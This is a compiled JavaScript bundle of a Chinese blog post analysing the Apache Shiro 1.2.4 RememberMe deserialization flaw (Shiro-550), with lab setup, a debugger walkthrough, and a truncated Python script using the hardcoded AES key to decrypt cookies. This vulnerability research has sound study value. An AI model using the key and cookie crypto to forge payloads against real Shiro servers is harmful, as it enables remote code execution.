(window.webpackJsonp=window.webpackJsonp||[]).push([[16],{433:function(t,a,s){"use strict";s.r(a);var e=s(14),n=Object(e.a)({},(function(){var t=this,a=t.$createElement,s=t._self._c||a;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("p",[t._v("Shiro漏洞复盘系列--1.2.4版本产生的反序列化安全问题。（Shiro-550）")]),t._v(" "),s("h2",{attrs:{id:"介绍"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#介绍"}},[t._v("#")]),t._v(" 介绍")]),t._v(" "),s("p",[t._v("Shiro对于RememberMe Cookie的处理方式如下：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210324232800.png",alt:"image-20210324232800002"}})]),t._v(" "),s("ul",[s("li",[t._v("检索该Cookie的值")]),t._v(" "),s("li",[t._v("Base64解码")]),t._v(" "),s("li",[t._v("AES解密")]),t._v(" "),s("li",[t._v("使用Java中原生的"),s("code",[t._v("ObjectInputStream")]),t._v("反序列化")])]),t._v(" "),s("p",[t._v("Shiro1.2.4版本及以下的AES的key是硬编码在其中的，"),s("code",[t._v("org.apache.shiro.mgt.AbsetractRememberMeManager")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325195133.png",alt:"image-20210324233334049"}})]),t._v(" "),s("p",[t._v("解密AES算法还需要两个要素：")]),t._v(" "),s("ul",[s("li",[t._v("mode（加解密算法）")]),t._v(" "),s("li",[t._v("IV（初始化向量）")])]),t._v(" "),s("p",[t._v("如果可以再确定以上两者，则可以通过构造Cookie的值从而触发反序列化Gadget（Shiro-550）。")]),t._v(" "),s("h2",{attrs:{id:"环境搭建"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),s("p",[t._v("下载Shiro1.2.4版本：")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("git")]),t._v(" clone https://github.com/apache/shiro.git  \n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("cd")]),t._v(" shiro\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("git")]),t._v(" checkout shiro-root-1.2.4\n")])])]),s("p",[t._v("编辑"),s("code",[t._v("shiro\\samples\\web\\pom.xml")]),t._v("文件，修改"),s("code",[t._v("jtsl")]),t._v("版本为1.2并且加入"),s("code",[t._v("commons-collections4")]),t._v("依赖：")]),t._v(" "),s("ul",[s("li",[s("code",[t._v("jstl")]),t._v("是为了正确识别JSP标签")]),t._v(" "),s("li",[s("code",[t._v("commons-collections4")]),t._v("是为了方便后续漏洞复现")])]),t._v(" "),s("div",{staticClass:"language-xml extra-class"},[s("pre",{pre:!0,attrs:{class:"language-xml"}},[s("code",[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("javax.servlet"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("jstl"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("1.2"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v(" \n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("scope")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("runtime"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("scope")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("org.apache.commons"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("commons-collections4"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("4.0"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("p",[t._v("用IDEA导入"),s("code",[t._v("shiro\\samples\\web\\pom.xml")]),t._v("项目，然后等待依赖下载，然后执行"),s("code",[t._v("mvn install")]),t._v("，如果出现以下错误，则需要额外在你的"),s("code",[t._v("./m2")]),t._v("文件夹下创建"),s("code",[t._v("toolchains.xml")]),t._v("，然后写入以下内容：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325192945.png",alt:"image-20210325192945203"}})]),t._v(" "),s("div",{staticClass:"language-xml extra-class"},[s("pre",{pre:!0,attrs:{class:"language-xml"}},[s("code",[s("span",{pre:!0,attrs:{class:"token prolog"}},[t._v('<?xml version="1.0" encoding="UTF-8"?>')]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("toolchains")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("xmlns")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://maven.apache.org/TOOLCHAINS/1.1.0"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("xmlns:")]),t._v("xsi")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://www.w3.org/2001/XMLSchema-instance"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[s("span",{pre:!0,attrs:{class:"token namespace"}},[t._v("xsi:")]),t._v("schemaLocation")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--插入下面代码--\x3e")]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("toolchain")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("type")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("jdk"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("type")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("provides")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n      "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("1.6"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n      "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("vendor")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("sun"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("vendor")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("provides")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("configuration")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("\x3c!--这里是你安装jdk的文件目录--\x3e")]),t._v("\n      "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("jdkHome")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("{Your_Path}/1.6.0.jdk/"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("jdkHome")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("configuration")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("toolchain")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("toolchains")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("p",[t._v("之后就是添加Tomcat并且配置"),s("code",[t._v("Artifact")]),t._v("，不再赘述，环境搭建成功之后的页面：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193632.png",alt:"image-20210325193632795"}})]),t._v(" "),s("h2",{attrs:{id:"调试分析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#调试分析"}},[t._v("#")]),t._v(" 调试分析")]),t._v(" "),s("h3",{attrs:{id:"序列化加密过程"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#序列化加密过程"}},[t._v("#")]),t._v(" 序列化加密过程")]),t._v(" "),s("p",[t._v("登录时勾选"),s("code",[t._v("Remember Me")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193814.png",alt:"image-20210325193813966"}})]),t._v(" "),s("p",[t._v("登录成功后就会在Cookie中发现"),s("code",[t._v("rememberMe")]),t._v("字段：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325193934.png",alt:"image-20210325193934623"}})]),t._v(" "),s("p",[t._v("在"),s("code",[t._v("org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin")]),t._v("打下断点，发送登录请求，开始调试：")]),t._v(" "),s("img",{staticStyle:{zoom:"80%"},attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325000957.png",alt:"image-20210325000957209"}}),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325000822.png",alt:"image-20210325000822124"}})]),t._v(" "),s("p",[t._v("如果勾选了RememberMe功能，则会进入"),s("code",[t._v("remembertIdentity")]),t._v("方法中：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325001716.png",alt:"image-20210325001716672"}})]),t._v(" "),s("p",[s("code",[t._v("getIndentityToRemember")]),t._v("方法会将用户的身份信息封装成一个对象，之后传入"),s("code",[t._v("rememberIdentity")]),t._v("方法：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002021.png",alt:"image-20210325002020908"}})]),t._v(" "),s("p",[s("code",[t._v("convertPrincipalsToBytes")]),t._v("方法会将之前得到包含用户信息的对象转化成一个bytes数组类型的对象，我们跟入该方法：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002206.png",alt:"image-20210325002206022"}})]),t._v(" "),s("p",[t._v("可以看到，先将"),s("code",[t._v("principals")]),t._v("对象进行序列化，之后再调用"),s("code",[t._v("encrypt")]),t._v("方法进行加密，先跟入"),s("code",[t._v("serialize")]),t._v("方法，可以看到Shiro是采用了Java中原生的"),s("code",[t._v("ObjectOutputStream#writeObject")]),t._v("方法进行序列化的，之后返回序列化信息的bytes数组对象：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325002334.png",alt:"image-20210325002334553"}})]),t._v(" "),s("p",[t._v("这个bytes数组对象会传入到"),s("code",[t._v("encrypt")]),t._v("方法中去，接着跟进"),s("code",[t._v("encrypt")]),t._v("方法：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325003201.png",alt:"image-20210325003201299"}})]),t._v(" "),s("p",[t._v("通过"),s("code",[t._v("getCipherService")]),t._v("方法可以获取到一个用于加密的"),s("code",[t._v("CipherService")]),t._v("接口对象，这个对象是在当前类的构造方法中就完成初始化了的：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325003657.png",alt:"image-20210325003657499"}})]),t._v(" "),s("p",[s("code",[t._v("AesCipherService")]),t._v("间接实现了"),s("code",[t._v("CipherService")]),t._v("接口，并且如果再跟进的话，可以发现"),s("code",[t._v("AesCipherService")]),t._v("也是调用了父类的构造方法进行初始化，确定了加密方式以及mode：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004132.png",alt:"image-20210325004132251"}})]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004150.png",alt:"image-20210325004150470"}})]),t._v(" "),s("p",[t._v("同样在Debug控制台也可以获取到对应的信息：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004253.png",alt:"image-20210325004253589"}})]),t._v(" "),s("p",[t._v("回到"),s("code",[t._v("encrypt")]),t._v("方法中来，接着跟进"),s("code",[t._v("cipherService#encrypt")]),t._v("，这里传入的第一个参数就是序列化之后的bytes数组，第二个参数就是之前提到的硬编码的AES-Key：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325004546.png",alt:"image-20210325004546278"}})]),t._v(" "),s("p",[t._v("通过"),s("code",[t._v("generateInitializationVector")]),t._v("方法获取到的其实是一个长度为16的随机字节数组，一路跟入到"),s("code",[t._v("org.apache.shiro.crypto.JcaCipherService#generateInitializationVector")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325005140.png",alt:"image-20210325005140075"}})]),t._v(" "),s("p",[t._v("通过"),s("code",[t._v("SecureRandom")]),t._v("来生成随机数，然后写入到长度为16的字节数组中，这个数组就是AES的初始化向量（IV），随后被传入"),s("code",[t._v("encrypt")]),t._v("方法中去：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325005501.png",alt:"image-20210325005501229"}})]),t._v(" "),s("p",[s("code",[t._v("org.apache.shiro.crypto.JcaCipherService#encrypt")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082245.png",alt:"image-20210325082219984"}})]),t._v(" "),s("p",[t._v("在第324行中的"),s("code",[t._v("crypt")]),t._v("方法把序列化数据、AES-Key、IV、MODE传入方法，进行AES加密，之后再把十六字节的IV和加密后的密文"),s("code",[t._v("encrypted")]),t._v("进行数组的拼接：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082500.png",alt:"image-20210325082500537"}})]),t._v(" "),s("p",[t._v("最后一路返回到"),s("code",[t._v("org.apache.shiro.mgt.AbstractRememberMeManager#encrypt")]),t._v("方法中，经上面分析可知，最好加密的结果为"),s("code",[t._v("十六字节的IV")]),t._v(" + "),s("code",[t._v("AES密文")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325082743.png",alt:"image-20210325082743615"}})]),t._v(" "),s("p",[t._v("再返回到"),s("code",[t._v("remembertIdentity")]),t._v("方法中，将加密完成后的整段密文传入"),s("code",[t._v("rememberSerializedIdentity")]),t._v("方法中：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325083414.png",alt:"image-20210325083414344"}})]),t._v(" "),s("p",[t._v("跟入"),s("code",[t._v("rememberSerializedIdentity")]),t._v("方法中，会把Base64编码之后的密文放入Cookie中：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325083506.png",alt:"image-20210325083506860"}})]),t._v(" "),s("h3",{attrs:{id:"反序列化解密过程"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#反序列化解密过程"}},[t._v("#")]),t._v(" 反序列化解密过程")]),t._v(" "),s("p",[t._v("发送只有RememberMe Cookie的请求，在"),s("code",[t._v("org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity")]),t._v("方法中打下断点：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325093936.png",alt:"image-20210325093936498"}})]),t._v(" "),s("p",[t._v("Cookie等信息都封装在"),s("code",[t._v("subjectContext")]),t._v("对象之中，跟入"),s("code",[t._v("rmm.getRememberedPrincipals")]),t._v("方法：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094251.png",alt:"image-20210325094251283"}})]),t._v(" "),s("p",[t._v("接着跟入"),s("code",[t._v("getRememberedSerializedIdentity")]),t._v("方法，在这个方法中会把请求中携带的Cookie信息提取出来进行Base64解码，然后返回解码之后的bytes数组对象：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094521.png",alt:"image-20210325094521328"}})]),t._v(" "),s("p",[t._v("返回之后回到"),s("code",[t._v("getRememberedPrincipals")]),t._v("方法中，接着跟入"),s("code",[t._v("convertBytesToPrincipals")]),t._v("方法，这个方法中会把上一步得到的bytes数组进行解密，然后进行反序列化：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094659.png",alt:"image-20210325094659443"}})]),t._v(" "),s("p",[t._v("跟入"),s("code",[t._v("decrypt")]),t._v("方法，整个流程就类似与序列化加密的过程，在获取到解密对象之后把加密的bytes数组和硬编码的AES-Key进行解密：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325094833.png",alt:"image-20210325094833446"}})]),t._v(" "),s("p",[t._v("跟入"),s("code",[t._v("cipherService.decrypt")]),t._v("方法，这个方法中会把前十六位的IV提取出来，之后用AES-Key进行解密：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095013.png",alt:"image-20210325095013104"}})]),t._v(" "),s("p",[t._v("解密之后的数据回到"),s("code",[t._v("convertBytesToPrincipals")]),t._v("方法中，传入"),s("code",[t._v("deserialize")]),t._v("方法：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095126.png",alt:"image-20210325095126639"}})]),t._v(" "),s("p",[t._v("跟入该方法，可以发现采用了原生"),s("code",[t._v("ObjectInputStream#readObject")]),t._v("方法来进行反序列化数据：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210325095345.png",alt:"image-20210325095345775"}})]),t._v(" "),s("h3",{attrs:{id:"aes-cbc安全性"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#aes-cbc安全性"}},[t._v("#")]),t._v(" AES-CBC安全性")]),t._v(" "),s("h4",{attrs:{id:"cookie解密"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#cookie解密"}},[t._v("#")]),t._v(" Cookie解密")]),t._v(" "),s("p",[t._v("由"),s("a",{attrs:{href:"https://www.jianshu.com/p/45848dd484a9",target:"_blank",rel:"noopener noreferrer"}},[t._v("关于AES加解密中CBC模式的IV初始化向量的安全性问题"),s("OutboundLink")],1),t._v("这篇文章可以认识到，CBC解密的时候如果IV向量错误，只会影响第一个块的数据解密结果，而之后其他块的IV则是上一个块的加密数据。")]),t._v(" "),s("p",[t._v("在Shiro的RememberMe数据的第一个块就是IV向量，所以使用一个错误的IV向量来对Cookie进行解密，只会让正确的IV的解密错误，而不影响真正数据的解密结果。")]),t._v(" "),s("div",{staticClass:"language-python extra-class"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# python2")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" sys\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" base64\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" Crypto"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Cipher "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" AES\n\nkey "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"kPH+bIxk5D2deZiIxcaaaA=="')]),t._v("\nMODE "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" AES"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("MODE_CBC\nIV "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("b' '")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v("\nencryptor "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" AES"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("new"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("base64"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("b64decode"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("key"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" MODE"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" IV"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v('# cookie = 